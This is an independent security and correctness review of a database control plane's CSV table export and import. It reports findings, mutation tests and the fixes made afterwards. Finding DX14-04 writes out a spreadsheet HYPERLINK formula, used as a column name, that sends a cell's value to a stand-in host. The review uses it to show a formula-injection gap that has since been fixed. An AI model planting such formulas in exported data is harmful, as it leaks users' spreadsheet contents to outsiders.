<!-- SPDX-License-Identifier: AGPL-3.0-only -->
<!-- Copyright (c) 2026, RooyeKhat Media Co -->
# Independent review: phase 14a, table CSV export and import (2026-11-22)

Reviewed: branch dx-cp at 3962c059a1 against its base 04132b6694 (design, ADR 0027, design review). Paths below are relative to the
repository root. Extensions for the PostgreSQL-backed runs were built from e279c14091 into private installs of PostgreSQL 18.7 and 19.0.

## Summary

| Severity | Count | Ids |
|---|---|---|
| critical | 0 | |
| high | 1 | DX14-01 |
| medium | 4 | DX14-02, DX14-03, DX14-04, DX14-05 |
| low | 7 | DX14-06 to DX14-12 |

The security perimeter is sound: no request reached another role's file, a plain-HTTP or setting-off request was refused everywhere that was
tried, the relay proof is checked and one-shot, SafeError never copies PostgreSQL text, and the janitor rules held under mutation. The one
finding that breaks a stated invariant is DX14-01: a task re-run after a successful COMMIT says "nothing was stored, repeat the operation"
(retryable), which doubles the rows when the user repeats. It is a narrow window, but the whole commit protocol exists to close exactly it.

What was run: unit tests of transfer, staging, relay, internalapi, httpapi, problem, fwdproof and config on Windows (all pass; see DX14-12
for one flaky test); the PostgreSQL-backed tests of cmd/kingresd (TestImport*, TestExport*, TestUpload*, TestDataTransfer*) on PostgreSQL 18
and 19, and the three-server TestDataTransferThroughAFollower on 19 (all pass); 30-second runs of FuzzScanner, FuzzSafeError, FuzzReader and
FuzzReaderRange (no crash, no new corpus file); 22 mutants (section "Mutants"); a hand test of PostgreSQL 18 virtual generated columns
(DX14-05).

## Findings

### DX14-01 (high): the commit intent is overwritten after COMMIT, so a re-run reports "nothing stored" and the retry doubles the rows

- File: kingres/control-plane/internal/ops/transfer_import.go:775 (`env.SetDetail(ctx, "committed N rows")`), :739 (the only guard of the commit
  step), :743-746 (the answer when no pending transaction exists), :544 (the guard of the load step).
- The design of the step is: the marker "commit sent for N rows" in the task detail is the only memory of the intent, and a run that finds it
  fails `import_outcome_unknown` and never retries. After `pl.tx.Commit` succeeds the step replaces the whole detail with "committed N rows".
  `SetDetail` replaces the text; the marker is gone.
- Scenario: COMMIT succeeds, `SetDetail("committed ...")` succeeds, and then the lease is lost, or kingresd stops, before the engine records
  the step as done (the window between `FaultStepRan` and `FaultStepRecorded` in task/task.go). The step is not NonIdempotent, so the next run
  executes it again. The detail has no marker, `takePending` returns nil (memory gone or taken), and the step answers `copy_interrupted`,
  retryable, with the text "nothing was stored, repeat the operation". The rows are in the table. The console offers a retry and the file is
  loaded a second time.
- Verified: a test that calls `stepImportCommit` with the detail "commit sent for 3 rows" gets `import_outcome_unknown`, not retryable; with
  the detail "committed 3 rows" it gets `copy_interrupted`, retryable, "nothing was stored" (test removed after the run).
- No test covers a crash after COMMIT. TestImportCommitFaultPoints kills the backend only before and after the intent write.
- Fix: never remove the marker. Write "commit sent for N rows; committed" (the check is `Contains`), or better keep the state out of the free
  text: a field of the task input or of the record (`intent`, `committed`) that only grows. The same field should make the load step refuse
  to run. Add a fault point "afterCommit" and a test that re-runs the step.

### DX14-02 (medium): the staging quota is forgotten at every start of kingresd

- File: kingres/control-plane/internal/ops/transfer.go:104-138 (`openXfer`), :196-212 (`reservation`); kingres/control-plane/internal/transfer/record.go:236
  (`OnServer`, never called); kingres/control-plane/internal/staging/store.go:370-411.
- `staging.Open` starts with an empty reservation map. `Store.Adopt` is called only by `xferState.reservation`, and that is called only when an
  upload chunk or an export write touches that one record. Nothing adopts the ready files and the receiving uploads at start, although the
  design says the quota is the sum over the live files. `Records.OnServer` and `Records.Reserved` exist for it and are unused.
- Scenario: the quota is 100 GiB and 90 GiB of exports and uploads sit in staging. kingresd restarts, or leadership returns to this server.
  `Reserve` sees a sum of 0 and accepts another 100 GiB; this repeats at every restart. The disk reserve still holds, because `diskCheckLocked`
  reads the real free space, so the disk is not filled past the reserve; but a receiving upload whose declared 20 GiB is not yet written is
  not counted in `unwrittenLocked` either, so its later growth can only be stopped by the free-space check, with `insufficient_disk`, and not
  by the quota.
- Fix: in `openXfer`, adopt every record of this server in the states receiving, building and ready (`OnServer`) before the first request is
  answered. Test: reserve, reopen the store through the ops layer, expect `transfer_quota_exceeded`.

### DX14-03 (medium): table import (and export) runs as a superuser, a BYPASSRLS role or a role with server-file predefined roles, against tables of other roles

- File: kingres/control-plane/internal/ops/transfer_import.go:319-326, 563 (no `refuseDangerousRole`); kingres/control-plane/internal/ops/transfer_export.go:125
  (`pg_has_role(current_user, c.relowner, 'USAGE')` is true for every superuser).
- The workbench refuses these roles (ops/query.go, F3). The design extends the refusal to `importDatabase` and says an export needs none
  ("only statements that the control plane writes itself"). That reasoning does not hold for `COPY ... FROM STDIN` of a table import: PostgreSQL
  runs, as the importing role, every trigger function, column default, check constraint and domain check of the target table, and the table
  and those functions can belong to another role (F22: an administrator's role may be a member of many roles, and any role with CREATE on a
  schema can create a table). Table import has no `acknowledgeOtherRolesCode`-style check, and `HasTriggers` and `ForeignCode` of `tableFacts`
  are declared and never filled.
- Scenario: an administrator whose PostgreSQL role is a superuser (the case the design itself describes for 14c) imports a file into a table
  that a low-privileged role owns and gave a trigger. The trigger function runs as the superuser. The workbench would have refused that
  session.
- For export, the same `pg_has_role` makes `OwnerIsRole` true for a superuser, so `exportColumnsCheck` returns before `untrustedFunctions`
  and before the row-level-security refusal. With PostgreSQL 18 this has no reachable effect (DX14-05), but the shortcut is wrong in
  principle.
- Fix: call `refuseDangerousRole` on the connection of every transfer step (cheap, one query), or, if superusers must be allowed, refuse an
  import into a table that has triggers, defaults or checks owned by another non-superuser role unless the request acknowledges it, with the
  same audit field as the export. Compute `OwnerIsRole` as `relowner = current_user's oid` or a membership that is not the superuser shortcut.

### DX14-04 (medium): the spreadsheet guard does not cover the header row

- File: kingres/control-plane/internal/transfer/csvopts.go:241 (the guard is a CASE on the values), :262 (`HEADER true`).
- The column names are written by PostgreSQL as the header and are not guarded. A column can be named `=HYPERLINK("https://x/?"&A2,"v")`
  (identifiers allow any character but controls, sqlx.NewIdent); the owner of the table is the party the guard is meant to defend against.
  With `spreadsheetSafe` true (the default) the header cell is still a formula.
- Fix: alias guarded names in the SELECT list (`AS "'=..."`), or write the header row in the control plane with the same pattern. A test:
  a table with a column named `=1+1` and `@x` exported with the default options has no header cell that starts with those characters.

### DX14-05 (medium, test and design gap): the untrusted-code check is untested, not repeated at step time, and can match only policies on PostgreSQL 18

- File: kingres/control-plane/internal/ops/transfer_export.go:240-256 (`untrustedFunctions`), :568-590 (the first two steps do not re-read the table).
- Mutant MI5 (the check always returns nothing) survives the whole suite: no test has a table with an expression that calls another role's
  function (the writer says so). Hand test on PostgreSQL 18.7: `CREATE TABLE ... g int GENERATED ALWAYS AS (s.f(a)) VIRTUAL` with a user
  function fails ("Virtual generated columns that make use of user-defined functions are not yet supported"), a user operator likewise, and a
  domain type is refused. So the only expressions the query can find are row-level-security policies, and those are already handled by the
  RLS refusal (owner or BYPASSRLS only). The check is, today, dead code with a user-visible refusal code (`export_untrusted_code`).
- It also reads the catalog once, at the request. `stepExportCheck` and `stepExportClass` do not re-check eligibility, privileges, RLS or
  foreign code (the design says "the steps do the table check again"); the import does re-check (`stepImportCheckTable`).
- Fix: either remove the check and the 422 code until PostgreSQL allows user code in virtual columns, or keep it and add a test with a policy
  (owner exporting a table whose policy calls a function of another role, FORCE ROW LEVEL SECURITY). Re-run the eligibility query in the
  write step. Mutant MI6 (removing `SET LOCAL row_security = off`) also survives for the same reason: no export test has an RLS table.

### DX14-06 (low): any read of an upload through another server's leadership marks it lost for good

- File: kingres/control-plane/internal/ops/transfer.go:424-427 (`GetUpload`), kingres/control-plane/internal/ops/transfer_export.go:558-560 (`loadExport`).
- After a leader change the new leader answers `getDataUpload` for an upload whose file lives on the previous leader by calling `setLost`,
  which sets the state `lost` and the reservation to 0. If leadership returns to the first server (a flap, which the control plane
  has to expect), the upload is gone, the janitor of that server then deletes its file, and 20 GiB must be sent again, although the file was
  intact and resumable. The design accepts losing an upload on a real leader change; it did not intend to lose it on a poll.
- Fix: answer 404 without changing the record, and let the janitor of the server that holds the file decide (it already sets `lost` for a
  missing file). Same for the `loadExport` mark.

### DX14-07 (low): an open import transaction has no owner after a stand-down

- File: kingres/control-plane/internal/ops/transfer_import.go:79-100, 798-800; kingres/control-plane/internal/ops/ops.go:125; task/task.go:791 (`standDown`).
- `pendingLoad` holds a connection with an open transaction (a RowExclusive lock on the target, remote transactions on the groups for a
  routed table) between the load and commit steps. It is released by the commit step, by `importOnFail`, and by a repeated load. A lease loss
  in that gap makes the engine stand down without a hook ("no record, no hook"), the new leader's commit step finds no pending transaction and
  fails with `copy_interrupted`, and the old leader keeps the connection open for the life of the process.
- Fix: a time limit on `loads` (a sweeper in the janitor job that rolls back entries older than the task limit or whose task is no longer
  running here), and `idle_in_transaction_session_timeout` on the connection.

### DX14-08 (low): the request-time size check skips the common case

- File: kingres/control-plane/internal/ops/transfer_import.go:306.
- `if size > cap && (gz == nil || !*gz)`: when the client did not name a compression (`gz == nil`, auto-detect), a plain file over 2 GiB (256
  MiB for a reference table) passes the request, runs the whole load, and is stopped by `LimitedExpansion` only after `MaxBytes` bytes were
  sent to PostgreSQL; the transaction rolls back. Correct but wasteful, and the 422 `import_too_large` with the advice to split the file is
  never given for this case.
- Fix: in the request, read the first two bytes of the staged file (the load step does it already) and apply the cap when it is not gzip.

### DX14-09 (low): the load step uses the column types of the request

- File: kingres/control-plane/internal/ops/transfer_import.go:456 (`cols, _, err := o.importTarget(...)`), :702 (`p.ColumnTypes`).
- For a reference table the typed-array cast is built from the types read at the request. The check at the step time compares only the number
  of columns. A column whose type was changed in between is cast through the old type and the result is whatever the assignment cast does.
- Fix: compare the types too (or re-read them in the step) and refuse with `forbidden` as for a changed column list.

### DX14-10 (low): the BOM is stripped whatever the encoding

- File: kingres/control-plane/internal/ops/transfer_import.go:495 (`p.SkipBOM`), kingres/control-plane/internal/transfer/scanner.go (`StripBOM`).
- `skipBom` defaults to true and removes the bytes EF BB BF even for a LATIN1 or WIN1252 file, where they are the three characters of data
  that begin the first cell. The first cell then loses its first characters, silently (the count check cannot see it).
- Fix: apply it only for `encoding: UTF8`, and refuse `skipBom: true` explicitly with another encoding.

### DX14-11 (low): the spreadsheet guard misses non-text types that can hold any text, and the janitor can raise a false "restored database" alarm

- csvopts.go:241 and `readFacts`: a column of type `xml` (content mode accepts any text) is not "stringy" and is not guarded. The design lists
  the `json` case under Known limits; `xml` is the same and should be listed or guarded (`typcategory = 'U'` and `typname IN ('xml')`).
- kingres/control-plane/internal/ops/transfer_janitor.go:53 and kingres/control-plane/internal/staging/janitor.go:74: `highest` is read in a transaction
  and the directory is listed afterwards. A transfer created between the two has a file id above `HighestID`, so the sweep answers
  `ErrRestoredDatabase`, logs an error that says the database looks restored, and skips the pass. Nothing is deleted (safe), but the alarm is
  false and can repeat on a busy system. Fix: list the directory first, read the rows afterwards, or ignore ids younger than `MinAge`
  when comparing.

### DX14-12 (low): smaller points

- `concurrency()` (transfer_export.go:259-272) counts, then the task is started later without a lock: two simultaneous requests of one role both
  pass the "one per role" limit.
- A request that is refused after the record was made (`failRecord`, and the `fail` of `CreateUpload`) leaves a row in the state failed for
  seven days; a loop of refused requests by an administrator grows the table until pruned.
- Disabling `dataTransfer.enabled` does not stop a running transfer task (the guard is at the request); say so in the README, or check the
  setting in the first step.
- `ClusterSettings.dataTransfer.stagingQuotaBytes` shows 100 GiB while the effective default may be a quarter of the file system.
- `ErrFrame`/relay: the proof does not cover the raw body (documented, protected by the mutual TLS and the one-shot nonce); acceptable.
- `TestSettingsOperations` (internal/httpapi) failed once under load during a parallel mutant run and passed alone and in the full run; it
  is not a transfer test, but it is flaky.
- A task whose COMMIT returned a server error that proves a rollback (a deferred constraint, class 23 at COMMIT) is reported as
  `import_outcome_unknown`. Conservative and right for the router's two-phase commit; for a local table the text could say "rolled back".

## Verdict on each deviation ("Results of the spikes and changes made by the code")

| # | Deviation | Verdict |
|---|---|---|
| S1.1 | idle body moves the write deadline too | Accept. Needed (the 204 of a long upload would fail otherwise); tested on HTTP/1.1 and 2 and through a real follower on PostgreSQL 19. |
| S1.2 | HTTP/2 needs nothing special | Accept. |
| S1.3 | leader side needs no change | Accept. The relay proof is checked before anything runs, is one-shot, and covers the frame headers (Range, Upload-Offset, Content-Length). |
| S2.1 / V3 | reference tables importable in 14a through typed arrays and a temporary table | Accept with conditions: DX14-09 (stale types), the temporary table needs SELECT on the columns (a role with INSERT only fails with 42501, safely), and mutant MI11 (`done != n`) survives, so the count check of the reference path is untested. All-or-nothing holds (one transaction). Memory is bounded by the 256 MiB cap. |
| S2.2 / V6 | `header: match` done by PostgreSQL, no request-time 422 | Accept. The first difference is correctly not named. |
| S2.3 / V6 | unquoted `\.` line refused although PostgreSQL treats it as data | Accept as the conservative choice; it rejects a legal one-column file. Keep the plan to drop it. |
| S2.4 / V7 | router errors carry no table or column; target added from the task | Accept. SafeError builds names only from fields, drops bucket-partition names, and never reads the text after "line N". Fuzzed and tested. |
| S2.5 / V4 | label `per-group` for a partitioned table too | Accept. `consistencyOf` labels per-group exactly when a hash table has buckets on more than one group; the label is computed twice (request and class step) and a bucket move in between can make it stronger than what was read (low). |
| S2.6 / V7 | identity columns may be listed; node-local sequences warn | Accept; the warning must really be shown (not checked here, console). |
| O.1 | role identity by name and OID | Accept (OID reuse after wrap-around is theoretical). Checked at every step. |
| O.2 | `reserved_bytes` and `updated_at` columns | Accept. See DX14-02: the column is not what the quota is built from after a restart. |
| O.3 | setting read by the leader only; TLS by the receiving server | Accept. Verified for the follower path and for the forwarded path (the forwarded identity skips only the TLS check, which the follower made). Mutants M7 and M8 died. |
| O.4 | `stagingQuotaBytes` shows 100 GiB when unset | Accept with the low note in DX14-12. |
| O.5 | contract lists only 14a enum values; only `ImportTableRequest` is closed | Accept (additive). |
| O.6 | `maxAtomicBytes` is a flag | Accept; DX14-08 about when it applies. |
| O.7 | load and commit are two steps sharing an open transaction, intent in the task detail | Reject as built: DX14-01 (the marker is overwritten) and DX14-07 (no owner of the open transaction after a stand-down). The idea is sound; the state must be a field that only grows, not free text. |
| O.8 | checks at the request and again in the steps | Accept for the import; not true for the export (DX14-05). |
| O.9 | reservation of an upload = declared + overhead; export estimate | Accept. |
| O.10 | reference tables refuse array columns | Accept. |
| O.11 | header match is PostgreSQL's | Accept. |
| O.12 | `maxConcurrent` counted from unfinished tasks | Accept with the race in DX14-12. |
| O.13 | cluster test harness serves HTTPS | Accept. |
| O.14 | not covered by tests | The list is honest and complete for what it names. The items that matter most are exactly where the findings are: leader-change faults (DX14-01, 06, 07), the untrusted-code check (DX14-05), KS001 during COPY and a group failing at COMMIT (not exercised; the code paths read correctly, see below). |

## Verified as correct

Security
- Another role's upload or export is 404 on every operation: `GetOwned` compares name and OID; the file name comes from the numeric id only;
  mutant MI9 (drop the owner comparison) died in two tests. `deleteDataExport` by any administrator is by design and audits the creator.
- A path outside staging cannot be reached: `staging.Open` refuses a symbolic link, a non-empty unmarked directory and the data directories;
  `Remove` and the janitor use names derived from the id, `Lstat`, and regular files only; the janitor needs name pattern, regular file,
  age, no row or a removal row, no reservation or writer, and no id above the database (mutants M9a, b, c, e, f each died).
- Sealed files: AES-GCM per 64 KiB segment, nonce prefix and sequence, AAD of id, sequence and last flag; the layout is derived from the size
  on disk; fuzz targets of the reader, the range reader, the layout and the key unwrap ran without a finding.
- The relay: `POST /forward-stream` is ToLeader, needs a certificate of a member, the proof of a session (SCRAM ClientKey proof with a
  16-byte nonce, a two-minute window and a replay cache, bound to kind, from, to, operation, path parameters, query and the frame
  headers), a frame of at most 64 KiB, strict JSON, and only the four request headers; response headers are an allowlist and CR, LF and NUL are
  dropped. Removing the check of the proof (mutant M10) kills three tests.
- TLS and the setting: refused with 403 on every operation of the tag when the request did not arrive over TLS, and with `data_transfer_disabled`
  on the leader; a setting that cannot be read fails closed (503). Mutants M7 and M8 died.
- SafeError: message, detail, hint, where and the failing row are never copied for any class; line numbers are parsed only from
  `COPY <relation>, line <digits>` where the relation matches the error's own table; bucket-partition names and socket paths are dropped;
  a connection or driver error is the fixed sentence. Mutant M4 (copy the PostgreSQL message) died in five tests and the fuzz target.
  Raw errors never reach the task: `xferStep` wraps every step, and the engine records the clipped text only of a `Coded` error.
- Hostile CSV: the scanner tracks the quote and the line-break style as PostgreSQL does (CR, LF, CR LF decided by the first break), caps a
  record at 16 MiB, refuses the end-marker line, and the count of records is compared with the command tag, so a disagreement between the
  scanner and the server rolls the transaction back and never stores a different number. NUL, bad encodings and bare quotes are PostgreSQL
  errors, mapped to fixed sentences. The delimiter, the quote and the null string are checked and written as literals; the quote is
  restricted for the client-only multibyte encodings (SJIS, BIG5, GBK) where a trail byte could be a quote. A gzip bomb is stopped at the
  limit by `LimitedExpansion` (an extra byte is an error, not a short file). The BOM is read three bytes ahead only.
- Disk: an upload is limited to its declared size, every chunk but the last is a multiple of 64 KiB, `Use` checks the quota and the free
  space as bytes are sealed (mutants M12 and M12b died), and an export stops at `maxFileBytes`. The exception is the restart (DX14-02).

Import correctness
- One explicit transaction, one COPY, the command tag compared with the records the scanner counted (header subtracted), the intent written
  under the lease (the store writes it only for the holder, the epoch and the state running, so a deposed leader and a cancelled task cannot
  record it), then COMMIT with a context that is not the request's. Mutants MI1 (no count check), MI8 (no liveness probe before the intent) and MI12 (no
  intent write) died.
- Cancel: accepted until the commit step runs; a cancel during the load interrupts the COPY and the deferred rollback runs; a cancel
  between load and commit reaches `importOnFail`, which takes the pending transaction. A lost lease during the load closes the connection.
- KS001, a moved bucket and a broken connection during the COPY are `copy_interrupted`, retryable, with the transaction rolled back by the
  deferred cleanup. An error at COMMIT is `import_outcome_unknown`, which is right for a two-phase commit that can be partial.
- A retry after `copy_interrupted` cannot double rows: the transaction died with the connection. The one hole is DX14-01.
- Reference-table path: the temporary table is `ON COMMIT DROP`, resolved first in the search path, read in order by `kx_n`, inserted from
  parallel `unnest` of typed arrays; all in the same transaction; the final count is checked twice. Texts round-trip under the fixed session
  formats (DateStyle, IntervalStyle, extra_float_digits, bytea_output, TimeZone, lc_monetary, client_encoding).

Export correctness
- A download is never silently short: the status line is sent with `Content-Length`; a failure after that panics with
  `http.ErrAbortHandler`; a reader that ends early without an error leaves fewer bytes than the declared length, which the server closes as
  an error on both protocols (the relay spike tests it). `Range` forms a-b, a-, -n, multi-range (ignored, whole file) and unsatisfiable (416
  with `Content-Range: bytes */size`) are tested end to end (mutant MI7 died in two tests); the ETag is the SHA-256 of the served bytes;
  the downloaded flag is set only when the last byte went out.
- A retried export rewrites the file from the start (the old one is removed, a new data key is made); the label is `single-snapshot` or
  `per-group` and never says more than one statement can promise; `FROM ONLY` is used for an inheritance parent.
- Export in a read-only transaction as the signed-in role with the session formats; a role without SELECT on a column is refused before
  the COPY, and PostgreSQL enforces it again.

Leader change
- Records carry `server_id`; every step and every read checks it against the server's own id and answers `transfer_leader_changed`
  (retryable) or 404; the janitor handles only the rows of its own server and refuses to delete anything when the directory shows ids the
  database never issued. Upload offsets come from the file, not the row; a second writer gets `upload_offset_mismatch` (`ErrBusy`).
  A client can resume an upload through any server while the leader stays the same (tested through a follower on PostgreSQL 19).
- The files of a former leader stay until it leads again (documented in the design, line "the janitor of the server that holds the file
  deletes it when that server runs again").

## Mutants

Unit mutants (Windows), applied to the worktree, run, restored:

| id | change | result |
|---|---|---|
| M4 | SafeError sentence = PostgreSQL message and detail | killed (5 tests and the fuzz target) |
| M5 | spreadsheet guard off | killed (TestCopyToSQL) |
| M6 | byteRange end + 1 | survived the unit suite (no unit test of `byteRange`); killed in the PostgreSQL-backed run as MI7 |
| M7 | TLS guard off | killed (TestDataTransferGuards) |
| M8 | setting guard off | killed (3 tests) |
| M9a | janitor ignores reservation and writer | killed |
| M9b | janitor ignores minimum age | killed (2) |
| M9c | janitor ignores the row | killed (2) |
| M9e | janitor ignores the restored-database guard | killed |
| M9f | janitor deletes non-regular files | killed |
| M10 | proof of the forwarded identity not verified | killed (3) |
| M12 | quota check off | killed (5) |
| M12b | free-space reserve check off | killed (2) |

PostgreSQL-backed mutants (PostgreSQL 18, lane l4, tests TestImport*, TestExport*, TestUpload*):

| id | change | result |
|---|---|---|
| MI1 | no count comparison before the commit | killed (TestImportRowCountMismatchRollsBack, TestUploadLifecycle) |
| MI2 | `Cancellable` ignores the intent marker | survived: equivalent, because the commit step is already running when the marker exists; the marker check is redundant |
| MI5 | untrusted-function check returns nothing | survived (DX14-05) |
| MI6 | `SET LOCAL row_security = off` removed | survived (DX14-05) |
| MI7 | byteRange end + 1 | killed (TestExportLocalTableAndDownload, TestExportRefusals) |
| MI8 | liveness probe before the intent removed | killed (TestImportCommitFaultPoints) |
| MI9 | owner comparison of `GetOwned` removed | killed (cross-role tests) |
| MI10 | owner re-check in the import steps removed | survived: defence in depth, the request already checks it |
| MI11 | reference-table `done != n` check removed | survived (the reference count check is untested) |
| MI12 | intent write removed | killed (TestImportCommitFaultPoints) |

Not mutated but found by reading, with no test that could catch it: DX14-01 (the overwritten marker), DX14-02 (quota after restart),
DX14-04 (header cell), DX14-06, DX14-07.

Environment note: every mutant was restored from a byte copy and `git status` of the review worktree was clean afterwards; the throwaway
PostgreSQL instance used for DX14-05 was stopped and its directory deleted; the private installs were deleted at the end.

## Fixes

The writer fixed every finding on the branch `dx-cp` after this review. Each fix has a test that fails without it (the mutant column says what was removed); the tests ran on
PostgreSQL 18 and 19. The design note has the matching section "Changes made after the independent review of 14a".

| Finding | Fix | Test | Mutant that the test kills |
|---|---|---|---|
| DX14-01 (high) | A marker row `kingres_transfer.import_marker` (key: task id) is written through a security definer function inside the transaction of the load, so it commits with the rows or not at all. A run that finds the intent reads it: `committed` finishes the task; otherwise it inserts a tombstone `aborted` (waits up to 60 s for a transaction that holds the key), after which no commit of that task can succeed, and fails `copy_interrupted` with the proof. "Nothing stored" is said only with that proof; when the marker cannot be asked (other leader, lock wait) the code is `import_outcome_unknown`. | `TestImportCrashAfterCommit` (lease lost after COMMIT: done, exactly 3 rows, marker `committed`); `TestImportCommitFaultPoints` (connection killed after the intent: `copy_interrupted` with the marker as proof, repeat works); `TestImportLeaseLostBeforeTheIntent` | the marker read always says "not committed": the crash test fails |
| DX14-07 | Load and commit are one step; no transaction lives between steps; the connection is closed by the step; `idle_in_transaction_session_timeout` is the time left of the task. The second step is *Confirm the commit* (reads the marker). | the same tests (no `pending` map exists any more) | |
| DX14-02 | The files of this server are adopted into the staging store when it opens. | `TestStagingQuotaHoldsAfterARestart` (a fresh HTTPS cluster, restart of kingresd, the second upload is refused) | no adoption: the second upload is accepted |
| DX14-03 | `refuseDangerousRole` at the import request (403) and in the load step; the export's `OwnerIsRole` is `relowner = oid of current_user`. | `TestImportRefusesADangerousRole` (BYPASSRLS refused, accepted without it); `TestExportSuperuserAndForcedRowSecurity` (a superuser is asked for `acknowledgeOtherRolesCode`) | dangerous check off; `pg_has_role` back |
| DX14-04 | Risky header cells get an apostrophe through the column alias (63 bytes). | `TestExportHeaderAndXMLCellsAreGuarded`, `TestRiskyCellAndHeaderAlias` (unit) | `RiskyCell` always false |
| DX14-05 | The export repeats the table, column and untrusted-code checks in its first step; MI5 and MI6 are now covered. | `TestExportUntrustedFunction`, `TestExportSuperuserAndForcedRowSecurity` (forced row security: the export must not end done) | untrusted check off (MI5): two tests fail; `row_security = on` (MI6): the forced-RLS part fails |
| DX14-06 | A poll on another server's leadership no longer marks a file lost; the export step does not either. | not covered by a test (needs a leader change and a return of the old leader; the three-server fault tests of CP6 do not cover this return) | |
| DX14-08 | The cap on a plain file looks at the first two bytes of the staged file. The old condition applied the cap to an auto-detected gzip file by its compressed size, which was the wrong way round for a compressed file; a plain file above the cap was refused already. | `TestImportSizeCapLooksAtTheFile` (257 MiB plain: 422; the same bytes in a gzip stream: accepted) | gzip look always false |
| DX14-09 | The types of the columns are compared in the check-table step (they matter for the typed-array cast of a reference table). | `TestImportColumnTypeChangedBeforeTheStep` (hook `beforeCheck`) | comparison off |
| DX14-10 | The BOM is removed for UTF-8 only; `skipBom: true` with another encoding is 400. | `TestImportByteOrderMark` | validation off |
| DX14-11 | `xml` columns and domains over xml are text for the guard. The janitor re-reads the highest id and retries once before it raises the restored-database alarm. | the xml part cannot run on the test build (no libxml); no test for the janitor retry (the race is inside the sweep) | |
| DX14-12 | A lock from the check of the limits to the start of the task (one transfer per role, race free); a refused request deletes its record; the first step of a task reads `dataTransfer.enabled` again; a task that is moving data is cancelled by the operator (documented). The display of the quota is left as it is. | `TestOneTransferPerRoleUnderRace` (a hook widens the window; two tables, so the rule of one task per table does not decide), `TestRefusedTransfersLeaveNoRecord`, `TestSettingOffEndsAPendingTask` | lock removed; delete off; setting check off |

Differences from the advice of the review, and why: the marker table is local to the database of the server that loaded and is written through a function, because a grant to the
role would block dropping it; after a change of leader the marker is not reachable and the outcome is `import_outcome_unknown`, which is the honest answer. The reference table of the
design is for the batch import of 14c. The first claim of DX14-08 (a plain file passes when no compression is named) was not what the code did; the real defect was the opposite case.
